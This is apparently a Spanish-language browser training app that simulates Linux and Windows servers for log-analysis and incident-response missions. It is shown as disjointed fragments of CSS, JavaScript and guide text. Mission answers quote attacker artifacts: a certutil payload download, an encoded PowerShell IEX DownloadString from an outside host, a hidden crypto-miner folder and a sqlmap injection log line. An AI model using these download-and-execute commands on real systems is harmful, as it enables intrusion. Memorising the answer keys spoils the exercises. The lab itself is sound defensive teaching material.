<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Laboratorio de Logs</title>
<meta name="claude:viewport-fit-sides" content="cover">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
<style>
:root {
  --bg: #f1efe8; --panel: #fbfaf6; --panel-2: #f4f1e9; --ink: #1c2227; --muted: #5b666e; --line: #d8d3c6;
  --accent: #0a6b5c; --accent-ink: #ffffff; --accent-soft: #dcefe9; --warn: #9a5200; --warn-soft: #f8e8cf; --ok: #1b7a3d; --ok-soft: #dcf0e2; --bad: #b3261e;
  --code-bg: #ece8dc; --shadow: 0 1px 2px rgba(20, 30, 30, .08), 0 6px 18px rgba(20, 30, 30, .06);
  --t-bg: #10161b; --t-fg: #d6dde3; --t-dim: #7d8a95; --t-caret: #5fd3a6; --t-line: #26313a; --t-hit: #2c3a22; --t-cur: #51461a; --t-bar: #18222a;
  --a0: #55616b; --a1: #ff6e6e; --a2: #5fd38d; --a3: #e6c45c; --a4: #6fa8ff; --a5: #d890ff; --a6: #58d2e8; --a7: #d6dde3;
  --a8: #7d8a95; --a9: #ff9090; --a10: #8aeab0; --a11: #f6da82; --a12: #9fc4ff; --a13: #e8b4ff; --a14: #92e5f4; --a15: #ffffff;
  --k0: #3a454e; --k1: #a33b3b; --k2: #2f8f58; --k3: #9a7d1c; --k4: #356bb8; --k5: #8a47b5; --k6: #2a8a9c; --k7: #b9c2c9;
}
@media (prefers-color-scheme: dark) {
  :root:not([data-theme="light"]) {
    --bg: #0d1115; --panel: #151b21; --panel-2: #1a222a; --ink: #e5eaee; --muted: #95a2ac; --line: #2a343d;
    --accent: #43cfab; --accent-ink: #06231c; --accent-soft: #14352d; --warn: #f0b45a; --warn-soft: #3a2a12; --ok: #66d08c; --ok-soft: #143222; --bad: #ff7b72;
    --code-bg: #212b34; --shadow: 0 1px 2px rgba(0, 0, 0, .4), 0 6px 18px rgba(0, 0, 0, .3);
    color-scheme: dark;
  }
}
:root[data-theme="dark"] {
  --bg: #0d1115; --panel: #151b21; --panel-2: #1a222a; --ink: #e5eaee; --muted: #95a2ac; --line: #2a343d;
  --accent: #43cfab; --accent-ink: #06231c; --accent-soft: #14352d; --warn: #f0b45a; --warn-soft: #3a2a12; --ok: #66d08c; --ok-soft: #143222; --bad: #ff7b72;
  --code-bg: #212b34; --shadow: 0 1px 2px rgba(0, 0, 0, .4), 0 6px 18px rgba(0, 0, 0, .3);
  color-scheme: dark;
}
* { box-sizing: border-box; }
html, body { margin: 0; }
body { background: var(--bg); color: var(--ink); font: 400 15px/1.5 "IBM Plex Sans", system-ui, -apple-system, "Segoe UI", sans-serif; -webkit-text-size-adjust: 100%; }
[hidden] { display: none !important; }
button, input { font: inherit; color: inherit; }
code, pre, .mono { font-family: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
code { background: var(--code-bg); padding: .08em .35em; border-radius: 4px; font-size: .88em; overflow-wrap: anywhere; }
pre { background: var(--code-bg); padding: 10px 12px; border-radius: 8px; overflow-x: auto; font-size: 12.5px; line-height: 1.5; margin: .6em 0; }
:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }

.app { display: flex; flex-direction: column; gap: 12px; height: calc(100dvh - env(safe-area-inset-top, 0px) - env(safe-area-inset-bottom, 0px)); min-height: 520px;
  padding-block: 12px; padding-left: max(16px, env(safe-area-inset-left, 0px)); padding-right: max(16px, env(safe-area-inset-right, 0px)); max-width: 1500px; margin: 0 auto; }
.top { display: flex; align-items: center; gap: 12px 18px; flex-wrap: wrap; }
.brand { display: flex; align-items: center; gap: 12px; min-width: 0; flex: 1 1 240px; }
.logo { display: grid; place-items: center; width: 40px; height: 40px; border-radius: 10px; background: var(--t-bg); color: var(--t-caret); font: 700 15px "JetBrains Mono", monospace; flex: none; box-shadow: var(--shadow); }
.bt { min-width: 0; }
.bt h1 { font-size: 18px; line-height: 1.2; margin: 0; font-weight: 600; letter-spacing: -.01em; text-wrap: balance; }
.bt p { margin: 0; color: var(--muted); font-size: 12.5px; overflow-wrap: anywhere; }
.score-box { display: flex; flex-direction: column; gap: 4px; min-width: 150px; flex: 0 1 210px; }
.score { font-size: 13px; color: var(--muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.score b { color: var(--ink); font-size: 16px; font-weight: 600; }
.bar { height: 5px; border-radius: 3px; background: var(--line); overflow: hidden; }
.bar i { display: block; height: 100%; width: 0; background: var(--accent); border-radius: 3px; transition: width .5s ease; }
.nav { display: flex; gap: 6px; flex-wrap: wrap; }
.nb { border: 1px solid var(--line); background: var(--panel); border-radius: 999px; padding: 6px 14px; cursor: pointer; font-weight: 500; font-size: 14px; }
.nb:hover { border-color: var(--accent); }
.nb.on { background: var(--accent); color: var(--accent-ink); border-color: var(--accent); }
.only-narrow { display: inline-block; }

.main { flex: 1; min-height: 0; display: grid; grid-template-columns: minmax(0, 1fr); gap: 14px; }
.pane { min-width: 0; min-height: 0; }
.term-pane { display: none; flex-direction: column; border-radius: 12px; overflow: hidden; background: var(--t-bg); box-shadow: var(--shadow); border: 1px solid var(--t-line); }
.side { min-height: 0; min-width: 0; position: relative; }
.sp { display: none; height: 100%; overflow-y: auto; background: var(--panel); border: 1px solid var(--line); border-radius: 12px; padding: 16px; box-shadow: var(--shadow); }
body[data-view="term"] .term-pane, body[data-view="missions"] #v-missions, body[data-view="cmds"] #v-cmds, body[data-view="guide"] #v-guide, body[data-view="theory"] #v-theory { display: flex; }
body[data-view="missions"] #v-missions, body[data-view="cmds"] #v-cmds, body[data-view="guide"] #v-guide, body[data-view="theory"] #v-theory { display: block; }
@media (min-width: 1000px) {
  .main { grid-template-columns: minmax(0, 1fr) minmax(360px, 430px); }
  .term-pane { display: flex !important; }
  .sp { display: none !important; }
  body[data-side="missions"] #v-missions, body[data-side="cmds"] #v-cmds, body[data-side="guide"] #v-guide, body[data-side="theory"] #v-theory { display: block !important; }
  .only-narrow { display: none; }
}

/* terminal */
.term-head { display: flex; align-items: center; gap: 10px; padding: 8px 12px; background: var(--t-bar); border-bottom: 1px solid var(--t-line); color: var(--t-dim); font: 500 12px "JetBrains Mono", monospace; flex: none; }
.dots { display: inline-flex; gap: 6px; } .dots i { width: 10px; height: 10px; border-radius: 50%; background: var(--a0); display: block; } .dots i:nth-child(1) { background: #ff6e6e; } .dots i:nth-child(2) { background: #e6c45c; } .dots i:nth-child(3) { background: #5fd38d; }
.tt { flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; text-align: center; } .tr { display: none; }
@media (min-width: 560px) { .tr { display: inline; } .tt { text-align: left; } }
.term-wrap { position: relative; flex: 1; min-height: 0; display: flex; }
.term { flex: 1; min-width: 0; overflow-y: auto; overflow-x: hidden; padding: 10px 12px 14px; background: var(--t-bg); color: var(--t-fg); font: 400 13.5px/1.45 "JetBrains Mono", ui-monospace, Menlo, Consolas, monospace; outline: none; position: relative; scrollbar-color: var(--a0) transparent; }
.meas { position: absolute; visibility: hidden; white-space: pre; pointer-events: none; left: 0; top: 0; }
.blk { white-space: pre-wrap; overflow-wrap: anywhere; word-break: break-word; }
.blk.cmd { margin-top: 2px; }
.line { display: flex; align-items: baseline; }
.ps1 { white-space: pre; flex: 0 1 auto; max-width: 75%; overflow: hidden; }
.inp { flex: 1; min-width: 6ch; background: transparent; border: 0; padding: 0; margin: 0; color: var(--t-fg); font: inherit; outline: none; caret-color: var(--t-caret); border-radius: 0; }
.inp.secret { color: transparent; caret-color: transparent; }
body[data-term="busy"] .term { cursor: progress; }
.a0 { color: var(--a0); } .a1 { color: var(--a1); } .a2 { color: var(--a2); } .a3 { color: var(--a3); } .a4 { color: var(--a4); } .a5 { color: var(--a5); } .a6 { color: var(--a6); } .a7 { color: var(--a7); }
.a8 { color: var(--a8); } .a9 { color: var(--a9); } .a10 { color: var(--a10); } .a11 { color: var(--a11); } .a12 { color: var(--a12); } .a13 { color: var(--a13); } .a14 { color: var(--a14); } .a15 { color: var(--a15); }
.k0 { background: var(--k0); } .k1 { background: var(--k1); } .k2 { background: var(--k2); } .k3 { background: var(--k3); } .k4 { background: var(--k4); } .k5 { background: var(--k5); } .k6 { background: var(--k6); } .k7 { background: var(--k7); }
.ab { font-weight: 700; }
.keys { display: flex; gap: 6px; flex-wrap: wrap; padding: 8px 10px; background: var(--t-bar); border-top: 1px solid var(--t-line); flex: none; }
.keys button, .pg-btns button { border: 1px solid var(--t-line); background: transparent; color: var(--t-fg); border-radius: 6px; padding: 5px 10px; font: 500 12px "JetBrains Mono", monospace; cursor: pointer; min-height: 32px; }
.keys button:active, .pg-btns button:active { background: var(--t-line); }
@media (min-width: 1000px) and (pointer: fine) { .keys { display: none; } }
.pager { position: absolute; inset: 0; display: flex; flex-direction: column; background: var(--t-bg); color: var(--t-fg); outline: none; z-index: 5; }
.pg-body { flex: 1; overflow-y: auto; overflow-x: hidden; padding: 8px 12px; font: 400 13.5px/1.45 "JetBrains Mono", ui-monospace, Menlo, Consolas, monospace; }
.pl { white-space: pre-wrap; overflow-wrap: anywhere; word-break: break-word; min-height: 1.45em; }
.pl.hit { background: var(--t-hit); } .pl.cur { background: var(--t-cur); }
.pg-bar { display: flex; align-items: center; gap: 4px 12px; flex-wrap: wrap; padding: 6px 12px; background: var(--t-bar); border-top: 1px solid var(--t-line); font: 500 12px "JetBrains Mono", monospace; color: var(--t-dim); flex: none; }
.pg-stat { color: var(--t-fg); font-weight: 700; } .pg-name { color: var(--t-fg); }
.pg-search { display: inline-flex; align-items: center; gap: 4px; color: var(--t-fg); } .pg-search input { background: transparent; border: 0; border-bottom: 1px solid var(--t-dim); color: var(--t-fg); font: inherit; width: 18ch; outline: none; }
.pg-help { display: none; flex: 1; } .pg-btns { display: inline-flex; gap: 6px; margin-left: auto; }
@media (min-width: 760px) { .pg-help { display: inline; } .pg-btns { margin-left: 0; } }

/* paneles laterales */
.ph h2 { margin: 0; font-size: 19px; font-weight: 600; letter-spacing: -.01em; }
.sub { margin: 2px 0 0; color: var(--muted); font-size: 13px; }
.btn { border: 1px solid var(--line); background: var(--panel-2); border-radius: 8px; padding: 7px 13px; cursor: pointer; font-weight: 500; font-size: 14px; min-height: 36px; }
.btn:hover { border-color: var(--accent); }
.btn.pri { background: var(--accent); color: var(--accent-ink); border-color: var(--accent); }
.btn.sm { padding: 4px 10px; font-size: 12.5px; min-height: 30px; }
.btn.warn { background: var(--warn-soft); color: var(--warn); border-color: var(--warn); }
.btn.on { background: var(--accent-soft); border-color: var(--accent); color: var(--ink); }
.mgrid { display: grid; gap: 10px; margin-top: 14px; }
.mcard { display: flex; align-items: center; gap: 12px; text-align: left; width: 100%; padding: 12px; border: 1px solid var(--line); border-radius: 10px; background: var(--panel-2); cursor: pointer; }
.mcard:hover { border-color: var(--accent); }
.mcard.full { border-color: var(--ok); background: var(--ok-soft); }
.m-ico { font-size: 22px; width: 38px; height: 38px; display: grid; place-items: center; background: var(--panel); border-radius: 9px; flex: none; }
.m-ico.big { width: 46px; height: 46px; font-size: 26px; }
.m-body { display: flex; flex-direction: column; gap: 3px; min-width: 0; flex: 1; }
.m-title { font-weight: 600; } .m-lvl { color: var(--muted); font-size: 12.5px; }
.m-bar { height: 4px; border-radius: 2px; background: var(--line); overflow: hidden; margin-top: 2px; } .m-bar i { display: block; height: 100%; background: var(--accent); }
.m-pts { font: 600 15px "JetBrains Mono", monospace; flex: none; } .m-pts small { color: var(--muted); font-size: 11px; font-weight: 400; }
.mfoot { margin-top: 18px; padding-top: 14px; border-top: 1px dashed var(--line); } .row { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin-top: 8px; } .ask { font-size: 13px; color: var(--warn); font-weight: 500; }
.back { border: 0; background: none; color: var(--accent); cursor: pointer; padding: 6px 0; font-weight: 500; margin-top: 6px; }
.mhead { display: flex; gap: 12px; align-items: center; margin-top: 4px; } .mhead h3 { margin: 0; font-size: 18px; }
.intro { color: var(--muted); font-size: 14px; margin: 10px 0 4px; text-wrap: pretty; }
.complete { background: var(--ok-soft); color: var(--ok); border-radius: 8px; padding: 8px 12px; font-weight: 500; font-size: 13.5px; }
.steps { list-style: none; padding: 0; margin: 12px 0 0; display: grid; gap: 10px; }
.step { border: 1px solid var(--line); border-radius: 10px; padding: 12px; background: var(--panel-2); }
.step.done { border-color: var(--ok); background: var(--ok-soft); }
.s-head { display: flex; gap: 10px; align-items: flex-start; }
.s-ico { width: 24px; height: 24px; border-radius: 50%; display: grid; place-items: center; font-size: 13px; flex: none; background: var(--panel); border: 1px solid var(--line); font-weight: 700; }
.step.done .s-ico { background: var(--ok); color: var(--panel); border-color: var(--ok); }
.s-text { margin: 0; flex: 1; min-width: 0; overflow-wrap: anywhere; text-wrap: pretty; }
.s-pts { font: 600 12px "JetBrains Mono", monospace; color: var(--muted); flex: none; padding-top: 3px; }
.step.done .s-pts { color: var(--ok); }
.s-ans { display: flex; gap: 8px; margin-top: 10px; flex-wrap: wrap; } .s-ans input { flex: 1 1 160px; min-width: 0; padding: 7px 10px; border: 1px solid var(--line); background: var(--panel); border-radius: 8px; min-height: 36px; }
.s-ans.shake { animation: shake .3s; } @keyframes shake { 25% { transform: translateX(-4px); } 75% { transform: translateX(4px); } }
@media (prefers-reduced-motion: reduce) { .s-ans.shake { animation: none; } .bar i { transition: none; } }
.s-bad { margin: 6px 0 0; color: var(--bad); font-size: 13px; } .s-auto, .s-note { margin: 8px 0 0; color: var(--muted); font-size: 13px; }
.s-tools { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 10px; }
.rv { margin-top: 10px; border-left: 3px solid var(--warn); padding-left: 10px; } .rv-k { font-size: 11.5px; text-transform: uppercase; letter-spacing: .06em; color: var(--warn); font-weight: 600; } .rv pre { margin: 4px 0 6px; white-space: pre-wrap; overflow-wrap: anywhere; }
.cg { margin-top: 16px; } .cg h3 { margin: 0 0 6px; font-size: 12px; letter-spacing: .08em; text-transform: uppercase; color: var(--muted); font-weight: 600; }
.cg ul { list-style: none; margin: 0; padding: 0; display: grid; gap: 6px; } .cg li { display: flex; gap: 6px; }
.chip { flex: 1; min-width: 0; display: flex; flex-direction: column; gap: 2px; text-align: left; border: 1px solid var(--line); background: var(--panel-2); border-radius: 8px; padding: 7px 10px; cursor: pointer; }
.chip:hover { border-color: var(--accent); } .chip code { background: none; padding: 0; color: var(--ink); font-size: 12px; overflow-wrap: anywhere; } .chip span { color: var(--muted); font-size: 12.5px; }
.go { flex: none; width: 36px; border: 1px solid var(--line); background: var(--accent-soft); color: var(--accent); border-radius: 8px; cursor: pointer; font-size: 12px; } .go:hover { border-color: var(--accent); }
.gnav { display: flex; gap: 6px; flex-wrap: wrap; margin: 12px 0; } .gbody h3 { margin: 6px 0 4px; font-size: 17px; } .gbody ul, .gbody ol { padding-left: 20px; margin: 8px 0; } .gbody li { margin: 4px 0; } .gbody p { text-wrap: pretty; }
.tbl { overflow-x: auto; } table { border-collapse: collapse; width: 100%; font-size: 13.5px; } th, td { text-align: left; padding: 6px 8px; border-bottom: 1px solid var(--line); vertical-align: top; } th { color: var(--muted); font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: .05em; }
.toast { position: fixed; left: 50%; bottom: calc(18px + env(safe-area-inset-bottom, 0px)); transform: translate(-50%, 20px); max-width: min(92vw, 520px); background: var(--ink); color: var(--bg); padding: 10px 16px; border-radius: 10px; font-size: 13.5px; opacity: 0; pointer-events: none; transition: opacity .25s, transform .25s; z-index: 50; box-shadow: var(--shadow); }
.toast.show { opacity: 1; transform: translate(-50%, 0); }
@media (max-width: 999px) { .score-box { flex: 1 1 100%; flex-direction: row; align-items: center; gap: 10px; } .score-box .bar { flex: 1; } .nav { width: 100%; } .nb { flex: 1; text-align: center; padding-inline: 8px; } .app { height: calc(100dvh - env(safe-area-inset-top, 0px) - env(safe-area-inset-bottom, 0px)); } }
/* ---- selector de sistema ---- */
.sysnav { display: inline-flex; border: 1px solid var(--line); border-radius: 999px; padding: 3px; background: var(--panel); gap: 2px; }
.sb { border: 0; background: transparent; color: inherit; border-radius: 999px; padding: 5px 13px; cursor: pointer; font-weight: 600; font-size: 13.5px; white-space: nowrap; }
.sb:hover { background: color-mix(in srgb, var(--accent) 12%, transparent); }
.sb.on { background: var(--accent); color: var(--accent-ink); }
body[data-sys="win"] { --t-bg: #012456; --t-bar: #0b1f3f; --t-line: #1d3a6e; --t-fg: #eeedf0; --t-dim: #8fa8d4; }
@media (max-width: 999px) { .sysnav { order: 2; margin-left: auto; } }

.thbox { margin: 12px 0; padding: 10px 12px; border-left: 3px solid var(--accent); background: var(--accent-soft); border-radius: 0 8px 8px 0; font-size: 14px; }
.thnav { display: flex; justify-content: space-between; gap: 8px; margin-top: 18px; flex-wrap: wrap; }
.gbody pre { overflow-x: auto; max-width: 100%; }
.mtools { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }

</style>
</head>
<body>
<div class="app">
  <header class="top">
    <div class="brand">
      <span class="logo" aria-hidden="true">&gt;_</span>
      <div class="bt"><h1>Laboratorio de Logs</h1><p id="subtitle">srv-web01 · simulador de terminal Linux</p></div>
    </div>
    <div class="sysnav" role="group" aria-label="Sistema operativo"><button type="button" class="sb on" data-sys="linux" aria-pressed="true">🐧 Linux</button><button type="button" class="sb" data-sys="win" aria-pressed="false">🪟 Windows</button></div>
    <div class="score-box" title="Puntuación"><div id="score" class="score"></div><div class="bar"><i id="scoreBar"></i></div></div>
    <nav class="nav" aria-label="Vistas">
      <button type="button" class="nb only-narrow" data-nav="term" aria-pressed="true">Terminal</button>
      <button type="button" class="nb" data-nav="theory" aria-pressed="false">Teoría</button>
      <button type="button" class="nb" data-nav="missions" aria-pressed="false">Misiones</button>
      <button type="button" class="nb" data-nav="cmds" aria-pressed="false">Comandos</button>
      <button type="button" class="nb" data-nav="guide" aria-pressed="false">Guía</button>
    </nav>
  </header>
  <main class="main">
    <section id="v-term" class="pane term-pane" aria-label="Terminal">
      <div class="term-head"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="tt" id="tt">alumno@srv-web01 — bash</span><span class="tr" id="tr">pts/0 · ssh</span></div>
      <div class="term-wrap">
        <div id="term" class="term" tabindex="0" role="log" aria-label="Salida del terminal">
          <span id="meas" class="meas" aria-hidden="true">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
          <div id="out" class="out"></div>
          <div id="line" class="line"><span id="ps1" class="ps1"></span><input id="inp" class="inp" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" enterkeyhint="send" aria-label="Línea de comandos"></div>
        </div>
        <div id="pager" class="pager" tabindex="-1" hidden>
          <div id="pgBody" class="pg-body"></div>
          <div class="pg-bar">
            <span id="pgStat" class="pg-stat">:</span><span id="pgName" class="pg-name"></span>
            <span id="pgSearchBox" class="pg-search" hidden>/<input id="pgSearch" type="text" autocomplete="off" spellcheck="false" aria-label="Buscar"></span>
            <span class="pg-help">q salir · espacio/b página · j/k línea · / buscar · n/N siguiente</span>
            <span class="pg-btns"><button type="button" data-pk="search">Buscar</button><button type="button" data-pk="up">▲</button><button type="button" data-pk="down">▼</button><button type="button" data-pk="pgdn">Pág ▼</button><button type="button" data-pk="q">Salir</button></span>

function login(t, user, ip, tty, method, dur, sudos) { PLAN.push({ t, user, ip, tty, method, dur, sudos: sudos || [] }); }
function emitLogin(s) {

  ev(s.t, 'auth', 'sshd', pid, 6, `Accepted ${s.method} for ${s.user} from ${s.ip} port ${port} ssh2` + (s.method === 'publickey' ? (s.user === EVIL ? ': ED25519 ' : ': RSA ') + fpr() : ''), 'ssh.service');

    ev(te + 60, 'auth', 'systemd-logind', 640, 6, `Session ${n} logged out. Waiting for processes to exit.`, 'systemd-logind.service');

/* ---------- ruido de fondo, minuto a minuto ---------- */
function genRange(a, b) {
  for (let m = Math.ceil(a / 60000) * 60000; m < b; m += 60000) {
    const p = lp(m), hh = p.h, mm = p.mi;
    if (mm % 15 === 0) cronJob(m + rnd(0, 900), '/usr/local/bin/healthcheck.sh');
    if (mm === 17) cronJob(m + rnd(0, 900), 'cd / && run-parts --report /etc/cron.hourly');
    if (hh === 6 && mm === 25) cronJob(m + 500, 'test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }');
    if (hh === 2 && mm === 30) cronJob(m + 300, '/usr/local/bin/backup.sh');
    if (hh === 0 && mm === 0) logrotateRun(m + 2000);
    if ((hh === 6 && mm === 43) || (hh === 18 && mm === 20)) aptDaily(m + 3000);
    if (hh === 6 && mm === 47) sdService(m + 1000, 'Daily man-db regeneration', 'man-db.service');
    if (mm === 40 && hh % 8 === 1) timesync(m + 5000);
    if (hh === 3 && mm === 10) sdService(m + 2000, 'Clean php session files', 'phpsessionclean.service');
    if (R() < 0.021) scanAttempt(m + rnd(0, 59000));
    if (R() < 0.022) ufwBlock(m + rnd(0, 59000));
    if (R() < 0.0015) ev(m + rnd(0, 59000), 'kern', 'kernel', null, 4, 'usb 1-1: device descriptor read/64, error -71');
    // web
    const lam = HOURW[hh] * 8 / 60; const n = Math.floor(lam) + (R() < lam % 1 ? 1 : 0);
    for (let k = 0; k < n; k++) genReq(m + rnd(0, 59999));
    if (mm % 5 === 0) monitorProbe(m + rnd(0, 2000));
    if (apiDown(m)) { monitorProbe(m + 15000); monitorProbe(m + 30000); monitorProbe(m + 45000); }
    if ((mm === 0 || mm === 30) && pgUp(m)) pgCheckpoint(m + rnd(0, 20000));
  }
}

}

      { id: 'w4b', kind: 'q', pts: 20, text: '¿A qué puerto TCP de la IP atacante se conectó para descargar el ejecutable?', hint: 'Mira la URL completa en la línea de comandos de certutil.', check: a => numIn(a) === 8080, sol: '8080 (http://203.0.113.45:8080/svchost32.exe).' },
      { id: 'w4c', kind: 'q', pts: 20, text: 'Hay un «powershell -enc …». Decodifícalo: ¿a qué IP descarga y ejecuta un script?', hint: () => `El texto está en Base64 UTF-16LE:\n[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('${W_ENC.slice(0, 40)}…'))\n(usa el valor completo de la línea de comandos del evento 4688)`, check: a => a.includes('203.0.113.200'), sol: "203.0.113.200 — IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.200:8080/k.ps1'). También lo ves en el evento 4104 del registro PowerShell/Operational." },

      { id: 'w4e', kind: 'q', pts: 15, text: '¿En qué carpeta oculta dejó el minero? (ruta o nombre)', hint: 'Get-ChildItem C:\\Windows\\Temp -Force   (-Force muestra lo oculto)', check: a => /\.k\b/.test(nrm(a)) || /windows\\temp/.test(nrm(a).replace(/\//g, '\\')), sol: 'C:\\Windows\\Temp\\.k — oculta (atributos h y s), con svchost32.exe, config.json y run.bat.' }

const WGUIDE = [
  { id: 'uso', t: 'Cómo se usa', html: `<p>El terminal de la izquierda es un <b>Windows Server 2019</b> simulado (<b>SRV-WIN01</b>) al que entras por Escritorio remoto con la cuenta <code>alumno</code>. Arranca en <b>PowerShell</b>; escribe <code>cmd</code> para pasar al símbolo del sistema y <code>exit</code> para volver.</p>
    <ul><li><b>Tab</b> autocompleta cmdlets, parámetros (<code>-Log…</code>), variables y rutas; <b>↑ ↓</b> recorren el historial; <b>Ctrl+C</b> corta; <b>Ctrl+L</b> limpia.</li>
    <li>La consola <b>no está elevada</b>: no puedes leer el registro <code>Security</code> ni parar procesos o servicios. Escribe <code>Start-Process powershell -Verb RunAs</code> y responde <code>S</code> al aviso de UAC. Con <code>whoami /groups</code> ves si estás en «High Mandatory Level». <code>exit</code> te devuelve a la sesión sin elevar.</li>
    <li>PowerShell trabaja con <b>objetos</b>, no con texto: <code>Get-Process | Where-Object CPU -gt 100 | Sort-Object CPU -Descending</code>. Para ver todas las propiedades usa <code>| Format-List *</code>.</li>
    <li>Los registros <b>siguen creciendo en directo</b>: aparecen accesos, tareas y peticiones IIS nuevas. Lo que haces queda auditado (4688, 4720, 4946…).</li>
    <li>Si lo estropeas todo, «Reiniciar sistema» (en Misiones) restaura el servidor. Los puntos se conservan.</li></ul>` },

  { id: 'obj', t: 'Anatomía de un evento', html: `<p>Un registro <code>EventLogRecord</code> tiene propiedades como <code>TimeCreated</code>, <code>Id</code>, <code>LevelDisplayName</code>, <code>ProviderName</code> y <code>Message</code>. Los datos "en bruto" están en <code>Properties</code>:</p>

    <p>Línea de IIS (W3C, <b>UTC</b>):</p><pre>2026-11-11 07:20:05 192.168.1.30 GET /products id=1'%20UNION… 80 - 192.0.2.88 sqlmap/1.7.2 - 200 0 0 78

  { id: 'ps', t: 'PowerShell en 1 minuto', html: `<ul><li><b>Verbo-Sustantivo</b>: <code>Get-</code>, <code>Set-</code>, <code>Start-</code>, <code>Stop-</code>, <code>Remove-</code>. Descubre con <code>Get-Command *evento*</code> y <code>Get-Help &lt;cmdlet&gt; -Examples</code>.</li>
    <li><b>Tubería</b> <code>|</code> pasa objetos: <code>Where-Object</code> (filtra), <code>Sort-Object</code>, <code>Group-Object</code>, <code>Select-Object</code>, <code>Measure-Object</code>, <code>ForEach-Object</code>.</li>
    <li><code>$_</code> es el objeto actual dentro de <code>{ }</code>; <code>-eq -ne -gt -lt -like -match -contains</code> son los operadores.</li>
    <li>Alias útiles: <code>?</code> (Where), <code>%</code> (ForEach), <code>gci</code>, <code>gc</code>, <code>sls</code> (Select-String), <code>select</code>, <code>sort</code>.</li>
    <li>Equivalencias Linux→Windows: <code>grep</code>→<code>Select-String</code>, <code>tail -f</code>→<code>Get-Content -Wait</code>, <code>ps</code>→<code>Get-Process</code>, <code>kill</code>→<code>Stop-Process</code>, <code>systemctl</code>→<code>Get-Service</code>, <code>journalctl</code>→<code>Get-WinEvent</code>, <code>ufw</code>→<code>New-NetFirewallRule</code>.</li></ul>` },
  { id: 'metodo', t: 'Método de investigación', html: `<ol><li><b>Qué y cuándo.</b> Fija una hora de referencia (alerta, caída).</li><li><b>Filtra</b> en el origen: <code>-FilterHashtable</code> es mucho más rápido que traer todo y filtrar después.</li><li><b>Cuenta y agrupa</b> con <code>Group-Object</code> y <code>Measure-Object</code>.</li>
    <li><b>Correlaciona</b> Security, System, Application y los logs de IIS alrededor de la misma hora (¡y cuidado con UTC!).</li><li><b>Contén</b>: corta procesos, bloquea IPs, cierra sesiones, quita tareas y cuentas.</li><li><b>Documenta</b>: hora, evidencia (el evento exacto) y qué hiciste.</li></ol>` }
];

'use strict';
/* ===================== 38 · TEORÍA, RUTA DE APRENDIZAJE Y MISIONES DE INICIACIÓN ===================== */
const thEx = (c, d, run) => `<li><button type="button" class="chip" data-cmd="${escHtml(c)}"><code>${escHtml(c)}</code><span>${escHtml(d)}</span></button>${run === 0 ? '' : `<button type="button" class="go" data-run="${escHtml(c)}" aria-label="Ejecutar" title="Ejecutar en el terminal">▶</button>`}</li>`;
const thList = items => `<section class="cg"><h3>Pruébalo (▶ ejecuta, o pulsa para escribirlo)</h3><ul>${items.map(i => thEx(i[0], i[1], i[2])).join('')}</ul></section>`;
const thBox = (t, x) => `<div class="thbox"><b>${t}</b> ${x}</div>`;
const THEORY_LINUX = [
  { id: 'tl0', t: '0 · Ruta de aprendizaje', html: `<p>Si es tu primera vez, sigue este orden. Cada misión tiene una lección de teoría asociada (botón «Ver teoría» dentro de la misión).</p>
    <div class="tbl"><table><thead><tr><th>Nivel</th><th>Misión</th><th>Lección</th></tr></thead><tbody>
    <tr><td>🟢 Iniciación</td><td>Primeros pasos con el terminal</td><td>3</td></tr><tr><td>🟢 Básico</td><td>Reconocimiento · Escribe tus propios logs</td><td>1, 2, 3</td></tr>
    <tr><td>🟡 Medio</td><td>Escáneres e inyección SQL · Auditoría de sudo · Rotación y journal · Fuerza bruta SSH</td><td>4, 5, 6, 8</td></tr>
    <tr><td>🔴 Avanzado</td><td>Persistencia y contención · OOM y disco lleno</td><td>6, 7, 8</td></tr></tbody></table></div>
    ${thBox('Cómo se puntúa:', 'cada paso da sus puntos; si pides <b>pista</b> pierdes el 30 %, si miras la <b>solución</b> no sumas. Los pasos de «hacer» se marcan solos al ejecutarlos; los de «preguntar» piden una respuesta escrita. Puedes equivocarte tantas veces como quieras.')}
    ${thBox('Consejo:', 'lee un ejemplo aquí, pulsa ▶ para ejecutarlo en el terminal y observa la salida antes de pasar a la misión.')}` },
  { id: 'tl1', t: '1 · Qué es un log', html: `<p>Un <b>log</b> (registro) es un fichero donde el sistema y los programas apuntan <b>qué ha pasado y cuándo</b>, una línea por suceso. Son la «caja negra» del servidor.</p>
    <p>Sirven para tres cosas:</p><ul><li><b>Diagnosticar</b>: ¿por qué se cayó el servicio a las 05:44?</li><li><b>Seguridad</b>: ¿quién intentó entrar, y lo consiguió?</li><li><b>Auditoría</b>: ¿quién ejecutó qué con sudo y cuándo?</li></ul>
    <p>Cada línea suele tener: <b>fecha y hora · máquina · programa[PID] · mensaje</b>. Además cada mensaje tiene una <b>severidad</b> (de <code>debug</code> a <code>emerg</code>); casi siempre te interesan <code>err</code> y superiores, y los <code>warning</code> previos.</p>
    ${thBox('Idea clave:', 'un log se <b>lee de abajo arriba</b> (lo más reciente al final) y se investiga <b>alrededor de una hora</b>: lo que ocurrió minutos antes suele ser la causa.')}
    ${thList([['tail -n 10 /var/log/syslog', 'Las 10 últimas líneas del log general']])}` },
  { id: 'tl2', t: '2 · Dónde viven los logs', html: `<p>En Linux casi todo está en <code>/var/log</code>. Algunos ficheros importantes:</p><div class="tbl"><table><thead><tr><th>Fichero</th><th>Qué guarda</th></tr></thead><tbody>
